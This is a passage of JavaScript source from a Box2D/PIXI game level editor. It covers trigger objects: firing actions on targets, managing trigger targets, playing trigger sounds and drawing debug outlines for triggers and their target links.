            }else if ((this.data.targetType >= triggerButtonIndex && this.data.repeatType == triggerButtonRepeatType.once)){
                this.destroy = true;
            }
        }
    }
    doTrigger() {
        if(this.triggeredThisTick) return;

        const randomTargetIndex = Math.floor(Math.random() * this.targets.length);

        let i, actionData;
        for(i = 0; i<this.data.worldActions.length; i++){
            actionData = this.data.worldActions[i];
            doAction(actionData, this);
        }
        if (!this.targets) return;
        for (i = 0; i < this.targets.length; i++) {
            if(!this.data.randomTarget || (this.data.randomTarget && randomTargetIndex === i)){
                let targetObject = this.targets[i];
                const triggerLength = this.data.triggerActions[i].length;
                for (var j = 0; j < triggerLength; j++) {
                    actionData = this.data.triggerActions[i][j];
                    doAction(actionData, targetObject);
                    if(targetObject.destroyed){
                        i--;
                        j = triggerLength;
                    }
                }
            }
        }

        if(this.data.checkpointPersistent && this.data.repeatType === triggerRepeatType.once){
            game.editor.persistentTriggers.push(this.data.ID);
        }

        this.triggeredThisTick = true;
    }
    setEnabled(enable) {

        if(!enable && (this.data.targetType == triggerTargetType.keydown || this.data.targetType == triggerTargetType.keyup)){
            this.touchingTarget = false;
        }

        const type = enable ? Box2D.b2_dynamicBody : Box2D.b2_staticBody
        this.trigger.SetType(type);
    }
}
export const addTargetToTrigger = function (_trigger, target) {

    if(target.data.prefabInstanceName){
        const prefab = game.editor.activePrefabs[target.data.prefabInstanceName]
        game.editor.updateObject(null, prefab);
        target = game.editor.textures.getChildAt(prefab.ID);
    }

    if([B2dEditor.object_TEXTURE, B2dEditor.object_GRAPHIC, B2dEditor.object_GRAPHICGROUP, B2dEditor.object_ANIMATIONGROUP].includes(target.data.type) && target.myBody) target = target.myBody.mySprite;

    if (_trigger.mySprite == target) return;
    if (_trigger.mySprite.targets.includes(target)) return;
    if (target.data.prefabInstanceName) {
        if (_trigger.mySprite.targetPrefabs.includes(target.data.prefabInstanceName)) return;
        _trigger.mySprite.targetPrefabs.push(target.data.prefabInstanceName);
    }

    _trigger.mySprite.targets.push(target);
    if (_trigger.mySprite.data.triggerActions.length < _trigger.mySprite.targets.length) _trigger.mySprite.data.triggerActions.push([getAction(getActionsForObject(target)[0])]);

    if (!target.myTriggers) target.myTriggers = [];
    target.myTriggers.push(_trigger);
}

export const replaceTargetOnTrigger = function (_trigger, old, _new) {
    for (let i = 0; i < _trigger.mySprite.targets.length; i++) {
        if (_trigger.mySprite.targets[i] == old) _trigger.mySprite.targets[i] = _new;
        old.myTriggers.filter(item => item !== _trigger);
        if (!_new.myTriggers) _new.myTriggers = [];
        _new.myTriggers.push(_trigger);
    }
}

export const removeTargetFromTrigger = function (_trigger, target) {
    var i;
    for (i = 0; i < _trigger.mySprite.targets.length; i++) {
        if (_trigger.mySprite.targets[i] == target) {
            _trigger.mySprite.targets.splice(i, 1);
            _trigger.mySprite.data.triggerActions.splice(i, 1);
            i--;
        }
    }
    for (i = 0; i < target.myTriggers.length; i++) {
        if (target.myTriggers[i] == _trigger) {
            target.myTriggers.splice(i, 1);
            i--;
        }
    }
    if (target.myTriggers.length == 0) target.myTriggers = undefined;

    if (!target.data) return;
    if (target.data.prefabInstanceName) {
        for (i = 0; i < _trigger.mySprite.targetPrefabs.length; i++) {
            if (_trigger.mySprite.targetPrefabs == target.data.prefabInstanceName) {
                _trigger.mySprite.targetPrefabs.splice(i, 1);
                break;
            }
        }
    }
}

const playTriggerSound = (data, position) => {
    const pos = data.local ? position : null;
    const pitch = data.pitch + Math.random()*(data.randomPitchOffset)-data.randomPitchOffset/2;
    AudioManager.playSFX(data.file, data.volume * 0.3, pitch, pos);
}

const playTriggerInstrument = data => {
    if(!data.instrument || !window[data.instrument]) return;
    const beatLength = data.bpm / 60;
    MidiPlayer.player.queueWaveTable(MidiPlayer.audioContext, MidiPlayer.input, window[data.instrument], 0, MidiPlayer.keyNoteMap[data.note], MidiPlayer.keyLengthMap[data.length]*beatLength);
}

const pixiPosition = new PIXI.Point();

export const drawEditorTriggers = ()=>{
	const camera = B2dEditor.container.camera || B2dEditor.container;

    game.editor.selectedPhysicsBodies.forEach(obj=>{
        if(obj.mySprite && obj.mySprite.data.type == game.editor.object_TRIGGER){
            const trigger = obj;

            const offsetInterval = 500;
            const offset = (Date.now() % offsetInterval + 1) / offsetInterval;
            const data = trigger.mySprite.data;

            let alphaDecreaser = trigger.mySprite.oldAlpha !== undefined ? 0.5 : 1.0;
            if(trigger.mySprite.alpha === 0.5) alphaDecreaser = 0.5;

            if(trigger.mySprite.alpha > 0){
                if (data.radius) {
                    let p = {
                        x: data.vertices[0].x * Settings.PTM,
                        y: data.vertices[0].y * Settings.PTM
                    };
                    const cosAngle = Math.cos(data.rotation);
                    const sinAngle = Math.sin(data.rotation);
                    const dx = p.x;
                    const dy = p.y;
                    p.x = (dx * cosAngle - dy * sinAngle);
                    p.y = (dx * sinAngle + dy * cosAngle);

                    pixiPosition.x = trigger.GetPosition().x * Settings.PTM + p.x;
                    pixiPosition.y = trigger.GetPosition().y * Settings.PTM + p.y;
                    game.levelCamera.matrix.apply(pixiPosition,pixiPosition);

                    game.editor.debugGraphics.lineStyle(3, 0xe0b300, 0.8*alphaDecreaser);
                    game.editor.debugGraphics.drawDashedCircle(data.radius * camera.scale.x * trigger.mySprite.scale.x, pixiPosition.x, pixiPosition.y, data.rotation, 20, 10, offset);
                } else {
                    const polygons = [];
                    let innerVertices = data.vertices

                    for (let k = 0; k < innerVertices.length; k++) {
                        const polygon = new PIXI.Point();
                        polygon.x = innerVertices[k].x * Settings.PTM * camera.scale.x * trigger.mySprite.scale.x;
                        polygon.y = innerVertices[k].y * Settings.PTM * camera.scale.x * trigger.mySprite.scale.x;
                        polygons.push(polygon);
                    }
                    pixiPosition.x = trigger.GetPosition().x * Settings.PTM;
                    pixiPosition.y = trigger.GetPosition().y * Settings.PTM;
                    game.levelCamera.matrix.apply(pixiPosition,pixiPosition);

                    game.editor.debugGraphics.lineStyle(3, 0xe0b300, 0.8*alphaDecreaser);
                    game.editor.debugGraphics.drawDashedPolygon(polygons, pixiPosition.x, pixiPosition.y, data.rotation, 20, 10, offset);
                }
            }

        }
    })

}
export const drawEditorTriggerTargets = targets=>{

    if(game.triggerDebugDraw.redrawTimer >= 0){
        game.triggerDebugDraw.redrawTimer --;
    }

    if(game.triggerDebugDraw.redrawTimer !== 0) return;

    targets.forEach(body => {

        if(body.mySprite.targets){
            let myPos = body.GetPosition();
            myPos = B2dEditor.getPIXIPointFromWorldPoint(myPos);

            for(let j = 0; j<body.mySprite.targets.length; j++){
                let target = body.mySprite.targets[j];
                let tarPos = vec1;
                let tarPrefab;

                if(target.data.prefabInstanceName){
                    tarPrefab = B2dEditor.activePrefabs[target.data.prefabInstanceName];
                    tarPos.Set(tarPrefab.x, tarPrefab.y);
                } else if ([game.editor.object_BODY, game.editor.object_TRIGGER].includes(target.data.type)) {
                    tarPos.Set(target.myBody.GetPosition().x, target.myBody.GetPosition().y);
                    b2MulVec2(tarPos, game.editor.PTM);
                } else{
                    tarPos.Set(target.x, target.y);
                }

                const lineOffsetSize = -20 * game.levelCamera.scale.x;
                const linePos = vec2;
                linePos.Set(myPos.x, myPos.y);
                b2SubVec2(linePos, tarPos);
                linePos.Normalize();
                b2MulVec2(linePos, lineOffsetSize);
                b2AddVec2(linePos, myPos);

                game.triggerDebugDraw.lineStyle(1.0 / game.editor.cameraHolder.scale.x, "0x000", 1.0);
                game.triggerDebugDraw.moveTo(linePos.x, linePos.y);
                game.triggerDebugDraw.lineTo(tarPos.x, tarPos.y);

                const v = vec3;
                v.Set(tarPos.x-linePos.x, tarPos.y-linePos.y);
                const l = v.Length();
                v.Normalize();
                const tl = l*0.5;
                b2MulVec2(v, tl);
                const tp = vec2;
                tp.Set(linePos.x, linePos.y);
                b2AddVec2(tp, v);

                game.triggerDebugDraw.beginFill("0x999", 1.0);
                game.triggerDebugDraw.drawCircle(tp.x, tp.y, 10 / game.editor.cameraHolder.scale.x);
                game.triggerDebugDraw.endFill();

                drawing.addText(j+1, game.triggerDebugDraw, tp, {fontSize: 14}, 1/game.editor.cameraHolder.scale.x);

            };

            if([triggerTargetType.keydown, triggerTargetType.keyup].includes(body.mySprite.data.targetType)){
                const keyName = `${KeyValLookup[body.mySprite.data.triggerKey]} ${(body.mySprite.data.targetType === triggerTargetType.keydown ? '(d)':'(u)')}`;
                const tarPos = vec1;
                tarPos.Set(myPos.x + 1, myPos.y + 1);
                drawing.addText(keyName, game.triggerDebugDraw, tarPos, {fill:0x000, fontSize: 14}, 1/game.editor.cameraHolder.scale.x);
                drawing.addText(keyName, game.triggerDebugDraw, myPos, {fontSize: 14}, 1/game.editor.cameraHolder.scale.x);
            }
        }
    });
    game.triggerDebugDraw.dirtyTargets = false;
}


const ACTION_GAME_WIN = window.atob("U2V0V2lu");
const ACTION_GAME_LOSE = window.atob("U2V0TG9zZQ==");
